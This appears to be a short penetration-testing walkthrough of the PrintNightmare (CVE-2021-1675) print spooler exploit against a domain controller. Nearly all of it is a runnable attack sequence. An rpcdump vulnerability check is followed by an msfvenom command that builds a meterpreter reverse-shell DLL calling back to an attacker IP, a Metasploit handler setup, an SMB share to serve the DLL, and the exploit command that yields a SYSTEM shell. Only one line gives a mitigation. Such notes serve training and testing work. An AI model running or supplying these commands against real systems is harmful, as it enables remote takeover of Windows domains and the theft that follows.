## PrintNightmare (CVE-2021-1675) Walkthrough
- Post-compromise attack
- Does not require authentication outside of a user account
- Takes advantage of the print spooler
- It runs as system privilege
- Similar to print spoofer, but more severe

### Attack
- Use the cube0x0 RCE exploit
- Use rpcdump to check if vulnerable: `rpcdump.py @<dc ip> | egrep 'MS-RPRN|MS-PAR'`
- If it shows "Print System Remote Protocol", it is vulnerable
- Follow installation directions
- Create malicious DLL: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=5555 -f dll > shell.dll`
- Run `msfconsole`
- `use exploit/multi/handler`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set lport 5555`
- `set lhost <attacker ip>`
- `run`
- Setup file share: `smbserver.py share 'pwd' -smb2support`
- Run exploit: `python3 CVE-2021-1675.py <domain>/<username>:<password>@<dc ip> '\\<attacker ip>\share\shell.dll'`
- If Defender is off, you get a shell as system

### Mitigation
- Disable print spooler
